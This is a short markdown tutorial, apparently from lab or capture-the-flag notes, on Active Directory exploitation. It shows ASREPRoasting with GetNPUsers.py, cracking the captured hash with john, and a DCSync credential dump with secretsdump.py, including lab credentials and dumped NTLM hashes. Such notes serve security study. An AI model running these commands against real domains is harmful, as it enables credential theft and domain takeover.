---
title: AD Exploitation
description: Introduction to Active directory exploitation.
---

# Active Directory - Exploitation

## ASREPRoasting

GetNPUsers.py : `Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking`

The only thing that's necessary to query accounts is a valid set of usernames.

```bash
$ GetNPUsers.py spookysec.local/ -dc-ip 10.10.169.152 -no-pass -usersfile valid_users.lst
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:6f85816183fca475066c51e9261ec717$eafe07ec0e87349f2ab00582d7becda....
[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[...]
```

Hash :
- Hashcat ID : 18200
- Name : Kerberos 5, etype 23, AS-REP

```bash
$ cat kerberos.hash
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:6f85816183fca475066c51e9261ec717$eafe...
$ john --wordlist=/opt/rockyou.txt kerberos.hash
[...]
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
managxxxxxxx   ($krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL)
```

## User synchronization

An account can have a permission that allows all Active Directory changes to be synced with an account. This includes password hashes. `secretsdump.py` allows you to retrieve all the passwords synced with the domain controller.

```bash
$ secretsdump.py -just-dc 'spookysec.local/backup:backup2517860@10.10.169.152'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[...]
```